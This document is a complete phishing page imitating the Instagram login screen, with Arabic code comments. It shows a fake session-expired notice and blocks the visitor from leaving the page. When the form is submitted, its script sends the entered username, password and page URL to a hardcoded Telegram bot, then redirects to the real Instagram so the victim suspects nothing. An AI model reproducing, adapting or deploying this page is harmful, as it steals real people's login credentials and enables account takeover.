<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
        }
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden; /* منع التمرير لتقييد الشاشة بالكامل */
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            background: #fff;
            border: none;
            text-align: center;
        }
        @media (min-width: 450px) {
            .login-container {
                border: 1px solid #dbdbdb;
                border-radius: 1px;
                padding: 40px;
            }
        }
        .logo-img {
            width: 175px;
            margin: 10px 0 25px 0;
        }
        .session-notice {
            font-size: 13px;
            color: #737373;
            line-height: 18px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 10px 12px;
            margin-bottom: 6px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .btn {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            margin-bottom: 15px;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }
        .or-line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            margin-bottom: 15px;
        }
        .forgot-pass {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
        }
    </style>
</head>
<body>

    <div class="login-container">

            </svg>
        </div>
        
        <div class="session-notice">
            Your session has expired. Please log in again to continue.
        </div>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn">Log In</button>
        </form>

        <div class="or-divider">
            <div class="or-line"></div>
            <div class="or-text">OR</div>
            <div class="or-line"></div>
        </div>

        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot-pass">Forgot password?</a>
    </div>

    <script>
        // قفل مغادرة الصفحة أو منع التحديث إلا بعد التفاعل
        window.addEventListener('beforeunload', function (e) {
            e.preventDefault();
            e.returnValue = '';
        });

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
            const chatId = "865078178";
            
            const message = "🎯 Locked View Capture:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            const img = new Image();
            img.src = url;

            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 500);
        });
    </script>
</body>
</html>
